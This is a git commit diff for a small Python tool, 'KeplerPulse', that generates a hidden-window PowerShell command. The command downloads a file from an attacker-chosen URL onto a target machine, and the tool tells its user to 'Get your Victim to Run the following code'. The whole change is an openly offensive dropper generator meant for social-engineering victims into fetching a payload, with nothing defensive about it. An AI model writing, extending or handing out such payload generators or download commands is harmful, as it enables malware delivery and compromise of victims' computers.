269b8b72a4cfb2be495a9caf2214e87f8ba3eeae
quantumcore <fahad.mustafa0012@gmail.com>
2020-01-26 21:38:30 +0500

    Powershell payload added, Make it working

--- main.py
+++ main.py
@@ -1,11 +1,36 @@
 from colorama import Fore, Style
 import colorama
-import datetime
-import os
-import socket
+import time
+import os, argparse
 
-PORT = "2003" # Can be changed
+banner = """
+██╗  ██╗███████╗██████╗ ██╗     ███████╗██████╗     ██████╗ ██╗   ██╗██╗     ███████╗███████╗
+██║ ██╔╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗    ██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
+█████╔╝ █████╗  ██████╔╝██║     █████╗  ██████╔╝    ██████╔╝██║   ██║██║     ███████╗█████╗  
+██╔═██╗ ██╔══╝  ██╔═══╝ ██║     ██╔══╝  ██╔══██╗    ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
+██║  ██╗███████╗██║     ███████╗███████╗██║  ██║    ██║     ╚██████╔╝███████╗███████║███████╗
+╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
 
-
+"""
 def __main__():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
+    powershell_ = "powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{source}','{dest}')"
+    parser = argparse.ArgumentParser(description="KeplerPulse")
+    parser.add_argument("--p", required=True, help="URL or Link to file to Download and Execute.")
+    parser.add_argument("--t", required=True,help="Target to save as.")
+    arguments = parser.parse_args()
+
+    # Get path to payload
+    payload = arguments.p
+    dest = arguments.t
+    stamp = str(time.strftime("%m/%d/%m"))
+    print(Style.BRIGHT + Fore.LIGHTRED_EX + banner + Style.RESET_ALL)
+    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Generating.." + Style.RESET_ALL)
+    old = powershell_.replace("{source}", payload)
+    new = old.replace("{dest}", dest)
+   
+    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Get your Victim to Run the following code"+ Style.RESET_ALL)
+    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + "{code}\n".format(code=new))
+
+
+if __name__ == "__main__":
+    __main__()
